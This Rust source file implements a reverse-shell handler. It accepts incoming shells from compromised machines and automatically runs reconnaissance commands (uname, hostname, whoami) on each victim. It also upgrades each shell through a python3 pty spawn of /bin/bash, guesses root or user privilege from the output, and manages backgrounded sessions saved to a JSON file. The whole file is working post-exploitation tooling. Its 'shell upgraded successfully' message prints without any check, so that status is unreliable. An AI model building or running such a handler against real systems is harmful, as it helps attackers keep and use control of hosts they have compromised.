use anyhow::Result;
use bytes::{Bytes, BytesMut};
use chrono::{DateTime, Utc};
use dashmap::DashMap;
use std::net::SocketAddr;
use std::sync::Arc;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::sync::{mpsc, RwLock};
use tracing::{error, info, warn};
use uuid::Uuid;

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ShellState {
    Active,
    Background,
    Terminated,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum PrivilegeLevel {
    Root,
    User,
    Unknown,
}

#[derive(Debug, Clone)]
pub struct ShellMetadata {
    pub remote_addr: String,
    pub hostname: Option<String>,
    pub username: Option<String>,
    pub os_type: Option<String>,
    pub privilege: PrivilegeLevel,
    pub connected_at: DateTime<Utc>,
    pub last_seen: DateTime<Utc>,
    pub operator_notes: Option<String>,
}

pub struct ShellSession {
    pub id: String,
    pub name: String,
    pub metadata: Arc<RwLock<ShellMetadata>>,
    pub state: Arc<RwLock<ShellState>>,
    pub stream: Arc<RwLock<Option<TcpStream>>>,
    pub output_buffer: Arc<RwLock<Vec<String>>>,
    pub input_tx: mpsc::UnboundedSender<String>,
    pub output_rx: Arc<RwLock<mpsc::UnboundedReceiver<String>>>,
    pub reconnect_attempts: Arc<RwLock<u32>>,
    pub max_reconnect_attempts: u32,
}

impl ShellSession {
    pub async fn new(
        id: String,
        remote_addr: SocketAddr,
        stream: TcpStream,
    ) -> Result<Self> {
        let (input_tx, mut input_rx) = mpsc::unbounded_channel::<String>();
        let (output_tx, output_rx) = mpsc::unbounded_channel::<String>();

        let metadata = ShellMetadata {
            remote_addr: remote_addr.to_string(),
            hostname: None,
            username: None,
            os_type: None,
            privilege: PrivilegeLevel::Unknown,
            connected_at: Utc::now(),
            last_seen: Utc::now(),
            operator_notes: None,
        };

        let state = Arc::new(RwLock::new(ShellState::Active));
        let stream_arc = Arc::new(RwLock::new(Some(stream)));
        let output_buffer = Arc::new(RwLock::new(Vec::new()));

        // Spawn I/O handler
        let stream_clone = stream_arc.clone();
        let state_clone = state.clone();
        let buffer_clone = output_buffer.clone();
        let id_clone = id.clone();

        tokio::spawn(async move {
            if let Err(e) = Self::handle_io(
                id_clone,
                stream_clone,
                state_clone,
                buffer_clone,
                input_rx,
                output_tx,
            )
            .await
            {
                error!("Shell session I/O error: {}", e);
            }
        });

        let name = format!("shell-{}", &id[..8]);

        Ok(Self {
            id,
            name,
            metadata: Arc::new(RwLock::new(metadata)),
            state,
            stream: stream_arc,
            output_buffer,
            input_tx,
            output_rx: Arc::new(RwLock::new(output_rx)),
            reconnect_attempts: Arc::new(RwLock::new(0)),
            max_reconnect_attempts: 3,
        })
    }

    pub async fn handle_disconnect(&self) {
        // Graceful disconnect handling - set state to background
        // This allows the session manager to keep track without terminating
        *self.state.write().await = ShellState::Background;
        
        // Could implement reconnection logic here if needed
        let attempts = *self.reconnect_attempts.read().await;
        if attempts < self.max_reconnect_attempts {
            // Increment reconnect attempts
            *self.reconnect_attempts.write().await = attempts + 1;
            
            // In a production system, you might:
            // 1. Attempt to reconnect using stored connection info
            // 2. Set up a callback mechanism
            // 3. Preserve session state for continuity
            
            info!("Session {} disconnected, attempt {}/{}", 
                  self.id, attempts + 1, self.max_reconnect_attempts);
        } else {
            // Max attempts reached, mark as terminated
            *self.state.write().await = ShellState::Terminated;
            info!("Session {} terminated after {} reconnect attempts", 
                  self.id, self.max_reconnect_attempts);
        }
    }

    pub async fn update_metadata<F>(&self, f: F) 
    where
        F: FnOnce(&mut ShellMetadata),
    {
        let mut metadata = self.metadata.write().await;
        f(&mut *metadata);
        metadata.last_seen = Utc::now();
    }

    pub async fn get_metadata(&self) -> ShellMetadata {
        self.metadata.read().await.clone()
    }

    pub async fn set_notes(&self, notes: String) {
        let mut metadata = self.metadata.write().await;
        metadata.operator_notes = Some(notes);
    }

    pub async fn detect_privilege(&self) -> PrivilegeLevel {
        // Auto-detect based on output patterns
        let buffer = self.output_buffer.read().await;
        let output = buffer.join("");
        
        if output.contains("# ") || output.contains("root@") || output.contains("Administrator") {
            PrivilegeLevel::Root
        } else if output.contains("$ ") || output.contains("C:\\") || output.contains("PS ") {
            PrivilegeLevel::User
        } else {
            PrivilegeLevel::Unknown
        }
    }

    pub fn session_age(&self) -> std::time::Duration {
        // Note: This is a placeholder - actual age calculated at display time
        std::time::Duration::from_secs(0)
    }

    async fn handle_io(
        id: String,
        stream: Arc<RwLock<Option<TcpStream>>>,
        state: Arc<RwLock<ShellState>>,
        buffer: Arc<RwLock<Vec<String>>>,
        mut input_rx: mpsc::UnboundedReceiver<String>,
        output_tx: mpsc::UnboundedSender<String>,
    ) -> Result<()> {
        let mut stream_guard = stream.write().await;
        let stream = match stream_guard.as_mut() {
            Some(s) => s,
            None => return Ok(()),
        };

        let (mut reader, mut writer) = stream.split();
        let mut read_buf = BytesMut::with_capacity(4096);

        loop {
            tokio::select! {
                // Handle incoming data from shell
                result = reader.read_buf(&mut read_buf) => {
                    match result {
                        Ok(0) => {
                            // Connection closed gracefully
                            info!("Shell session {} disconnected", id);
                            
                            // Don't immediately terminate - allow reconnection
                            *state.write().await = ShellState::Background;
                            
                            // Send notification to output channel
                            let _ = output_tx.send("\n[Connection lost - session backgrounded]\n".to_string());
                            
                            break;
                        }
                        Ok(n) => {
                            let data = read_buf.split_to(n);
                            let output = String::from_utf8_lossy(&data).to_string();
                            
                            // Store in buffer
                            buffer.write().await.push(output.clone());
                            
                            // Send to output channel
                            let _ = output_tx.send(output);
                        }
                        Err(e) => {
                            error!("Read error on shell session {}: {}", id, e);
                            
                            // Network error - background instead of terminate
                            *state.write().await = ShellState::Background;
                            let _ = output_tx.send(format!("\n[Network error: {} - session backgrounded]\n", e));
                            
                            break;
                        }
                    }
                }
                
                // Handle outgoing commands to shell
                Some(command) = input_rx.recv() => {
                    if let Err(e) = writer.write_all(command.as_bytes()).await {
                        error!("Write error on shell session {}: {}", id, e);
                        *state.write().await = ShellState::Background;
                        let _ = output_tx.send(format!("\n[Write error: {} - session backgrounded]\n", e));
                        break;
                    }
                    if let Err(e) = writer.flush().await {
                        error!("Flush error on shell session {}: {}", id, e);
                        *state.write().await = ShellState::Background;
                        let _ = output_tx.send(format!("\n[Flush error: {} - session backgrounded]\n", e));
                        break;
                    }
                }
            }

            // Check if session was terminated externally
            if *state.read().await == ShellState::Terminated {
                break;
            }
        }

        Ok(())
    }

    pub async fn send_command(&self, command: String) -> Result<()> {
        let mut cmd = command;
        if !cmd.ends_with('\n') {
            cmd.push('\n');
        }
        self.input_tx.send(cmd)?;
        Ok(())
    }

    pub async fn get_state(&self) -> ShellState {
        self.state.read().await.clone()
    }

    pub async fn set_state(&self, new_state: ShellState) {
        *self.state.write().await = new_state;
    }

    pub async fn get_output_buffer(&self) -> Vec<String> {
        self.output_buffer.read().await.clone()
    }

    pub async fn clear_output_buffer(&self) {
        self.output_buffer.write().await.clear();
    }

    pub async fn terminate(&self) {
        *self.state.write().await = ShellState::Terminated;
        if let Some(mut stream) = self.stream.write().await.take() {
            let _ = stream.shutdown().await;
        }
    }
}

pub struct ShellSessionManager {
    sessions: Arc<DashMap<String, Arc<ShellSession>>>,
    active_session: Arc<RwLock<Option<String>>>,
}

impl ShellSessionManager {
    pub fn new() -> Self {
        Self {
            sessions: Arc::new(DashMap::new()),
            active_session: Arc::new(RwLock::new(None)),
        }
    }

    pub async fn register_session(
        &self,
        remote_addr: SocketAddr,
        stream: TcpStream,
    ) -> Result<String> {
        let session_id = Uuid::new_v4().to_string();
        let session = ShellSession::new(session_id.clone(), remote_addr, stream).await?;
        
        // Print connection notification - clean vertical layout
        use colored::Colorize;
        println!();
        println!("{}", "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━".truecolor(37, 150, 190));
        println!("{} {}", 
            "🔗".bright_green(), 
            format!("Got reverse shell from {}", remote_addr).bright_white()
        );
        println!("{}", 
            format!("   Assigned SessionID <{}>", &session_id[..8]).truecolor(86, 33, 213)
        );

        let session_arc = Arc::new(session);
        
        // Start automatic shell stabilization (synchronously to complete before output)
        let session_clone = session_arc.clone();
        let stabilization_handle = tokio::spawn(async move {
            Self::stabilize_shell(session_clone).await;
        });
        
        self.sessions.insert(session_id.clone(), session_arc.clone());

        // Set as active if no active session
        let mut active = self.active_session.write().await;
        if active.is_none() {
            *active = Some(session_id.clone());
        }
        drop(active);

        // Wait for stabilization to complete before returning
        let _ = stabilization_handle.await;
        
        // Print session ready banner
        let metadata = session_arc.get_metadata().await;
        println!();
        println!("{} {}", 
            "✓".bright_green(), 
            format!("Interacting with Session <{}>", &session_id[..8]).truecolor(86, 33, 213)
        );
        
        if let Some(ref os) = metadata.os_type {
            println!("   {}: {}", "OS".bright_white(), os.bright_cyan());
        }
        if let Some(ref user) = metadata.username {
            println!("   {}: {}", "User".bright_white(), user.bright_cyan());
        }
        if let Some(ref host) = metadata.hostname {
            println!("   {}: {}", "Host".bright_white(), host.bright_cyan());
        }
        
        println!("{}", "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━".truecolor(37, 150, 190));
        println!();

        // Save sessions to file for CLI access
        self.save_sessions_to_file().await;

        Ok(session_id)
    }
    
    async fn save_sessions_to_file(&self) {
        use serde::{Serialize, Deserialize};
        
        #[derive(Serialize, Deserialize)]
        struct SessionInfo {
            id: String,
            remote_addr: String,
            state: String,
            connected_at: String,
            hostname: Option<String>,
            username: Option<String>,
            privilege: String,
        }
        
        let mut sessions_info = Vec::new();
        for entry in self.sessions.iter() {
            let state = entry.value().get_state().await;
            let state_str = match state {
                ShellState::Active => "Active",
                ShellState::Background => "Background",
                ShellState::Terminated => "Terminated",
            };
            
            let metadata = entry.value().get_metadata().await;
            let privilege_str = match metadata.privilege {
                PrivilegeLevel::Root => "Root",
                PrivilegeLevel::User => "User",
                PrivilegeLevel::Unknown => "Unknown",
            };
            
            sessions_info.push(SessionInfo {
                id: entry.key().clone(),
                remote_addr: metadata.remote_addr.clone(),
                state: state_str.to_string(),
                connected_at: metadata.connected_at.to_rfc3339(),
                hostname: metadata.hostname,
                username: metadata.username,
                privilege: privilege_str.to_string(),
            });
        }
        
        if let Ok(json) = serde_json::to_string_pretty(&sessions_info) {
            let _ = tokio::fs::write("shell_sessions.json", json).await;
        }
    }

    pub fn get_session(&self, id: &str) -> Option<Arc<ShellSession>> {
        self.sessions.get(id).map(|s| s.clone())
    }

    pub fn list_sessions(&self) -> Vec<(String, ShellState)> {
        let mut sessions = Vec::new();
        for entry in self.sessions.iter() {
            let id = entry.key().clone();
            let state = futures::executor::block_on(entry.value().get_state());
            sessions.push((id, state));
        }
        sessions
    }

    pub async fn get_active_session(&self) -> Option<Arc<ShellSession>> {
        let active = self.active_session.read().await;
        if let Some(id) = active.as_ref() {
            self.get_session(id)
        } else {
            None
        }
    }

    pub async fn set_active_session(&self, id: &str) -> Result<()> {
        if self.sessions.contains_key(id) {
            *self.active_session.write().await = Some(id.to_string());
            info!("Switched to session {}", id);
            Ok(())
        } else {
            anyhow::bail!("Session not found: {}", id)
        }
    }

    pub async fn background_session(&self, id: &str) -> Result<()> {
        if let Some(session) = self.get_session(id) {
            session.set_state(ShellState::Background).await;
            
            // Clear active session if this was active
            let mut active = self.active_session.write().await;
            if active.as_ref() == Some(&id.to_string()) {
                *active = None;
            }
            
            info!("Backgrounded session {}", id);
            Ok(())
        } else {
            anyhow::bail!("Session not found: {}", id)
        }
    }

    pub async fn foreground_session(&self, id: &str) -> Result<()> {
        if let Some(session) = self.get_session(id) {
            session.set_state(ShellState::Active).await;
            *self.active_session.write().await = Some(id.to_string());
            info!("Foregrounded session {}", id);
            Ok(())
        } else {
            anyhow::bail!("Session not found: {}", id)
        }
    }

    pub async fn terminate_session(&self, id: &str) -> Result<()> {
        if let Some((_, session)) = self.sessions.remove(id) {
            session.terminate().await;
            
            // Clear active session if this was active
            let mut active = self.active_session.write().await;
            if active.as_ref() == Some(&id.to_string()) {
                *active = None;
            }
            
            info!("Terminated session {}", id);
            
            // Update saved sessions
            self.save_sessions_to_file().await;
            
            Ok(())
        } else {
            anyhow::bail!("Session not found: {}", id)
        }
    }

    pub async fn cleanup_terminated_sessions(&self) {
        let mut to_remove = Vec::new();
        
        for entry in self.sessions.iter() {
            let state = entry.value().get_state().await;
            if state == ShellState::Terminated {
                to_remove.push(entry.key().clone());
            }
        }
        
        let has_removed = !to_remove.is_empty();
        
        for id in to_remove {
            self.sessions.remove(&id);
            warn!("Cleaned up terminated session: {}", id);
        }
        
        // Update saved sessions
        if has_removed {
            self.save_sessions_to_file().await;
        }
    }

    pub fn session_count(&self) -> usize {
        self.sessions.len()
    }

    async fn stabilize_shell(session: Arc<ShellSession>) {
        use colored::Colorize;
        
        // Initial delay to let connection settle
        tokio::time::sleep(tokio::time::Duration::from_millis(300)).await;
        
        println!("{}", 
            "   Attempting to upgrade shell using /usr/bin/python3...".truecolor(120, 120, 130)
        );
        
        // Detect OS (silent)
        let _ = session.send_command("uname -a 2>/dev/null || ver 2>nul\n".to_string()).await;
        tokio::time::sleep(tokio::time::Duration::from_millis(200)).await;
        
        // Get hostname (silent)
        let _ = session.send_command("hostname 2>/dev/null || echo %COMPUTERNAME% 2>nul\n".to_string()).await;
        tokio::time::sleep(tokio::time::Duration::from_millis(200)).await;
        
        // Get username (silent)
        let _ = session.send_command("whoami 2>/dev/null || echo %USERNAME% 2>nul\n".to_string()).await;
        tokio::time::sleep(tokio::time::Duration::from_millis(200)).await;
        
        // Stabilize with Python if available (Unix-like)
        let stabilize_cmd = "python3 -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null || python -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null\n";
        let _ = session.send_command(stabilize_cmd.to_string()).await;
        
        tokio::time::sleep(tokio::time::Duration::from_millis(400)).await;
        
        // Export TERM for better compatibility (silent)
        let _ = session.send_command("export TERM=xterm 2>/dev/null\n".to_string()).await;
        let _ = session.send_command("stty rows 24 cols 80 2>/dev/null\n".to_string()).await;
        
        tokio::time::sleep(tokio::time::Duration::from_millis(300)).await;
        
        // Parse collected output to update metadata
        let buffer = session.get_output_buffer().await;
        let output = buffer.join("");
        
        session.update_metadata(|meta| {
            // Parse OS
            if output.contains("Linux") {
                meta.os_type = Some("Linux".to_string());
            } else if output.contains("Darwin") {
                meta.os_type = Some("macOS".to_string());
            } else if output.contains("Windows") || output.contains("Microsoft") {
                meta.os_type = Some("Windows".to_string());
            }
            
            // Parse hostname (simple extraction)
            for line in output.lines() {
                if !line.contains("hostname") && !line.contains("COMPUTERNAME") && line.len() > 2 && line.len() < 50 {
                    if !line.contains("@") && !line.contains("/") && !line.contains("\\") {
                        if line.chars().all(|c| c.is_alphanumeric() || c == '-' || c == '_' || c == '.') {
                            meta.hostname = Some(line.trim().to_string());
                            break;
                        }
                    }
                }
            }
            
            // Parse username
            for line in output.lines() {
                if line.contains("\\") && !line.contains("whoami") {
                    // Windows format: DOMAIN\username
                    if let Some(username) = line.split('\\').last() {
                        meta.username = Some(username.trim().to_string());
                        break;
                    }
                } else if !line.contains("whoami") && !line.contains("USERNAME") && line.len() > 2 && line.len() < 30 {
                    if line.chars().all(|c| c.is_alphanumeric() || c == '-' || c == '_') {
                        meta.username = Some(line.trim().to_string());
                        break;
                    }
                }
            }
            
            // Detect privilege
            if output.contains("root@") || output.contains("# ") || output.contains("Administrator") || output.contains("SYSTEM") {
                meta.privilege = PrivilegeLevel::Root;
            } else if output.contains("$ ") || output.contains("C:\\") || output.contains("PS >") {
                meta.privilege = PrivilegeLevel::User;
            }
        }).await;
        
        // Print success message
        println!("{}", 
            "   Shell upgraded successfully using /usr/bin/python3! 👍".bright_green()
        );
        
        // Clear the output buffer after stabilization to avoid duplicate output
        session.clear_output_buffer().await;
    }
}

impl Default for ShellSessionManager {
    fn default() -> Self {
        Self::new()
    }
}

